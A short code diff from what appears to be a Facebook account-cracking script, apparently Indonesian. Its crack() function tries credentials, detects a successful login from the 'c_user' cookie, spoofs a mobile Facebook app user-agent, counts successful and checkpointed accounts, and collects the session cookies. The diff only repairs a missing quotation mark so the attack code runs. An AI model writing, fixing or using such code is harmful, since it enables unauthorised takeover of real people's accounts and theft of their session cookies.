@@ -722,7 +722,7 @@ def crack(idf,pwv):
 				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				headapp={"user-agent":Mozilla/5.0 (Linux; Android 7.0; BLADE L7A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/325.0 .1.4.108;]"}
+				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 7.0; BLADE L7A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/325.0 .1.4.108;]"}
 				if 'no' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
